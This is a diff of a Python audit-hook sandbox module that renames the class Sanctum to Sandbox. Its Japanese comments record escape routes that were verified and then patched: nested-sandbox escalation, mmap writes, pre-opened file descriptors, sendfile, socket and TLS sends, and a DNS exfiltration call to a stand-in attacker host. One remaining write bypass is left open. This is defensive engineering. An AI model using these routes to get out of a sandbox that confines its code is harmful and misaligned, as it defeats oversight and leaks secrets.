@@ -41,7 +41,7 @@ _active_stack = []
 
 _STDLIB_ALLOWED_READ_DIRS = [Path(p).resolve() for p in {sys.prefix, sys.exec_prefix, sys.base_prefix, sys.base_exec_prefix} if p]
 
-class Sanctum:
+class Sandbox:
     def __init__(self, allowed_dirs=None, allowed_hosts=None, restrict_reads=False):
         """
         allowed_dirs:   書き込み・破壊的操作を許可するディレクトリ一覧。
@@ -64,9 +64,9 @@ class Sanctum:
         # "jail_workspace"の祖先(あらゆる絶対パスの祖先は"/")であるため
         # 後半の条件が真になり、子の`allowed_dirs`が`["/"]`(ファイル
         # システム全体)に\*\*昇格\*\*してしまう重大な脱獄脆弱性だった。
-        # 実機検証済み: `with Sanctum(allowed_dirs=["jail_workspace"]):`の
-        # 内側で`with Sanctum(allowed_dirs=["/"]):`を開き、`/tmp/`配下への
-        # 書き込みが実際に成功することを確認した。ネストしたSanctumは
+        # 実機検証済み: `with Sandbox(allowed_dirs=["jail_workspace"]):`の
+        # 内側で`with Sandbox(allowed_dirs=["/"]):`を開き、`/tmp/`配下への
+        # 書き込みが実際に成功することを確認した。ネストしたSandboxは
         # 「親より狭くすることしかできない」のが設計意図であるべきなので、
         # 後半の祖先方向の判定を削除し、前半(子は親の配下でなければ
         # 棄却される)のみを残した。
@@ -134,7 +134,7 @@ def _is_path_allowed(target_path, allowed_dirs) -> bool:
             # (例: allowed_dirs=["jail_workspace"]に対し実際に存在する
             # "JAIL_WORKSPACE"という完全に別のディレクトリ)への書き込み・
             # 破壊的操作が許可されてしまう脆弱性があった(Linux等の大文字
-            # 小文字を区別するファイルシステムで実機検証済み: Sanctum配下で
+            # 小文字を区別するファイルシステムで実機検証済み: Sandbox配下で
             # allowed_dirs外の"JAIL_WORKSPACE_repro"ディレクトリへの書き込み
             # がブロックされずに通過することを確認)。本来この文字列比較は
             # パス区切り文字(バックスラッシュ→スラッシュ)の正規化のみを
@@ -182,7 +182,7 @@ ALWAYS_PASSTHROUGH_AUDIT_EVENTS = frozenset({
     # 実機(CPython 3.13)で実際に`sys.addaudithook`で捕捉したところ、
     # ソケット生成時に本当に発火するイベント名は"socket.__new__"であり、
     # この一覧に含まれていなかったことを確認した。その結果、
-    # `allowed_hosts`を指定してSanctumを起動していても、**ソケットの
+    # `allowed_hosts`を指定してSandboxを起動していても、**ソケットの
     # 生成そのもの**(`socket.socket(...)`、ホスト情報を一切持たない)が
     # 無条件に`_trigger_violation`されてしまい、許可ホストへの接続を含む
     # 正当な通信フローが、接続を試みる前の時点で常に失敗する
@@ -289,12 +289,12 @@ def _michael_absolute_defense(event: str, args: tuple):
         # `connect`/`send`/`sendall`等、接続後の経路のみを対象としており、
         # 名前解決そのものは一度もチェックされていなかった。
         #
-        # 実機で、`runtime_guard.Sanctum(allowed_hosts={"approved.example.com"})`
+        # 実機で、`runtime_guard.Sandbox(allowed_hosts={"approved.example.com"})`
         # の内側から、許可されていないホスト名
         # (`f"{secret}.attacker-exfil-example.com"`)で`socket.getaddrinfo`
         # を呼び出したところ、`LossOfAtaraxia`は一切発生せず、このサンド
         # ボックス自身のDNS到達性の欠如によるOSErrorでのみ失敗すること
-        # (=Sanctum自体は何も遮断していないこと)を確認した。
+        # (=Sandbox自体は何も遮断していないこと)を確認した。
         #
         # [対応] "socket.getaddrinfo"を`ALWAYS_PASSTHROUGH_AUDIT_EVENTS`
         # から除外し、専用の検査を新設する。ホスト名が`None`の場合
@@ -343,7 +343,7 @@ def _michael_absolute_defense(event: str, args: tuple):
         # 周辺、`_guarded_os_write`等)は os.write/os.pwrite/os.writev/
         # os.pwritev の4系統のみをラップしていた。しかし
         # `mmap.mmap(fd, length, access=mmap.ACCESS_WRITE)` で、
-        # 「Sanctumに入る『前』に確保しておいた書き込み用fd」をメモリに
+        # 「Sandboxに入る『前』に確保しておいた書き込み用fd」をメモリに
         # マップし、`mm[0:N] = b'...'` のようなスライス代入をするだけで、
         # os.write系APIを一切経由せずにファイルへ書き込める。これは
         # os.write系とは別個の、CPythonの正式な監査イベント
@@ -352,7 +352,7 @@ def _michael_absolute_defense(event: str, args: tuple):
         # open/os.open・削除系・リネーム系のいずれにも一致せず、さらに
         # 後述4のデフォルト拒否の`monitored_namespaces`にも"mmap."が
         # 含まれていないため、完全に素通りしていた。実機検証済み:
-        # allowed_dirs外のファイルについて、Sanctumに入る前に確保した
+        # allowed_dirs外のファイルについて、Sandboxに入る前に確保した
         # fdをmmapし、スライス代入で書き込む攻撃が、例外を一切発生
         # させずに成功することを確認した)。
         #
@@ -577,7 +577,7 @@ def inquisition(source_code: str, context: dict = None) -> List[Finding]:
 # -----------------------------------------------------------
 # CPythonの sys.addaudithook には os.write / os.pwrite / os.writev
 # に対応する監査イベントが存在しない（実機検証済み）。そのため、
-# Sanctumコンテキストに入る「前」に書き込み用fdを確保しておけば、
+# Sandboxコンテキストに入る「前」に書き込み用fdを確保しておけば、
 # os.open の監査（上記）を完全に回避して任意パスへの書き込みが
 # できてしまっていた。sys.addaudithookはPython本体のイベントが
 # 発生しない呼び出しまでは監視できないため、ここでは os モジュール
@@ -611,7 +611,7 @@ def _check_fd_not_socket(fd: int, api_name: str):
     `os.pwritev`(いずれも既存の`_guarded_os_*`ラッパーが
     `_check_fd_write_allowed`しか呼んでおらず、本関数を呼んでいなかった
     ため)にも及んでいることを実機で発見した――`os.write(sock.fileno(),
-    data)`で、Sanctum起動**前**に接続済みのソケットへ、起動**後**に
+    data)`で、Sandbox起動**前**に接続済みのソケットへ、起動**後**に
     実際にデータを書き込めてしまうことを、実TCP接続で確認済みである。
     そのため、本関数は単一のAPI専用ではなく、ソケットfdへの書き込み系
     API呼び出し全般に対する共通の防御として一般化した。
@@ -706,7 +706,7 @@ def _guarded_os_pwritev(fd, buffers, offset, *a, **kw):
 # しない)。この2関数はいずれもカーネルの同名syscall相当を直接呼び、
 # ユーザー空間のバッファを経由しないため、os.write/pwrite/writev/pwritev
 # のいずれも一度も呼ばない。実機検証済み: allowed_dirs外のファイルに
-# ついて、Sanctumに入る前に確保した書き込み用fdへ、別のfdから
+# ついて、Sandboxに入る前に確保した書き込み用fdへ、別のfdから
 # `os.sendfile`または`os.copy_file_range`で直接データを転送する攻撃が、
 # 例外を一切発生させずに成功し、ファイル内容が実際に書き換わることを
 # 確認した。
@@ -715,10 +715,10 @@ def _guarded_os_pwritev(fd, buffers, offset, *a, **kw):
 # 方針で、`os`モジュールのこの2関数自体をラップし、書き込み先fd
 # (out_fd / dst)を既存の`_check_fd_write_allowed`に通す。
 #
-# [正直に残る限界] 同じ調査の過程で、Sanctumに入る「前」に確保した
+# [正直に残る限界] 同じ調査の過程で、Sandboxに入る「前」に確保した
 # Pythonファイルオブジェクト(`open(path, 'r+b')`等が返す
 # `io.FileIO`/`io.BufferedWriter`)の`.write()`メソッドも、同様に
-# 監査イベントを発生させず、本修正後もSanctumを完全に迂回して
+# 監査イベントを発生させず、本修正後もSandboxを完全に迂回して
 # 書き込めることを実機で確認した。これはCPythonの`_io`拡張型の
 # メソッドで、`io.FileIO.write = ...`のような通常の属性代入による
 # モンキーパッチが`TypeError: cannot set 'write' attribute of
@@ -758,9 +758,9 @@ def _guarded_os_copy_file_range(src, dst, count, offset_src=None, offset_dst=Non
 # `checks/guard_network_exfiltration.py`の§CA時点のコメントは、
 # 「TCP経由のsend/sendallは専用eventを持たないが、必ず事前のconnectを
 # 要する(=forbidden集合で遮断済み)ため検査不要」と判断していた。しかし
-# これは、§CN・§CD等で繰り返し発見している「Sanctum起動**前**に確保した
+# これは、§CN・§CD等で繰り返し発見している「Sandbox起動**前**に確保した
 # fd・接続は、起動後も検査を素通りする」という同じ前提openedバイパスの
-# 構造を見落としていた――実機で確認したところ、Sanctum起動**前**に
+# 構造を見落としていた――実機で確認したところ、Sandbox起動**前**に
 # connect()しておいたソケットは、起動**後**に`.send()`/`.sendall()`で
 # データを送出しても、`_michael_absolute_defense`は一度も呼ばれず
 # (そもそも監査イベントが発火しないため)、無条件に成功した。これは
@@ -769,7 +769,7 @@ def _guarded_os_copy_file_range(src, dst, count, offset_src=None, offset_dst=Non
 #
 # [設計方針の違い: §CNとの比較] §CNのos.sendfileは「ソケット宛の送出に
 # 正当な用途が想定されない」として無条件拒否を選んだが、本件のsend/
-# sendallは**ソケット通信そのものの正規の手段**であり、Sanctum起動後に
+# sendallは**ソケット通信そのものの正規の手段**であり、Sandbox起動後に
 # 許可されたホスト(allowed_hosts)へ接続して送信する、という正当な
 # フローを壊してはならない。そのため、既存の`_michael_absolute_defense`
 # の「2. ソケット通信検査」が`connect`/`sendto`/`sendmsg`に対して行って
@@ -804,7 +804,7 @@ def _check_socket_send_allowed(sock, api_name: str):
             _trigger_violation(
                 api_name, (target_host,),
                 f"{api_name}でソケットの送信先'{target_host}'が許可リストに"
-                f"含まれていません(Sanctum起動前の事前接続バイパス対策、§CO)。"
+                f"含まれていません(Sandbox起動前の事前接続バイパス対策、§CO)。"
             )
     finally:
         _hook_state.in_hook = False
@@ -828,7 +828,7 @@ def _guarded_socket_sendall(self, *a, **kw):
 # モンキーパッチしても、`ssl.SSLSocket`のインスタンス(`ssl.wrap_socket`
 # や`SSLContext.wrap_socket`が返す、`requests`・`urllib`等が内部で
 # 実際に使っているTLSソケット)には一切効果が及ばない。実機で、自己
-# 署名証明書を用いた本物のTLSループバック接続を確立し、Sanctum起動
+# 署名証明書を用いた本物のTLSループバック接続を確立し、Sandbox起動
 # **後**に`SSLSocket.send()`で機密データを送出したところ、§COの修正後
 # でも例外無しに成功し、受信側に実際にデータが届くことを確認した――
 # §COより**さらに実際的な**経路である(AIが生成したコードが外部APIへ
@@ -868,7 +868,7 @@ def _guarded_ssl_socket_sendall(self, *a, **kw):
 # `_ssl._SSLSocket`オブジェクトへの直接呼び出し——であり、`send`/
 # `sendall`はおろか、基底クラスの`socket.socket`のどのメソッドも
 # 一切経由しない、全く別の第三の経路だった。実機で、自己署名証明書
-# による本物のTLSループバック接続を確立し、Sanctum起動**後**に
+# による本物のTLSループバック接続を確立し、Sandbox起動**後**に
 # `SSLSocket.write()`で機密データを送出したところ、§CPの修正後でも
 # 例外無しに成功し、受信側に実際にデータが届くことを確認した。
 #
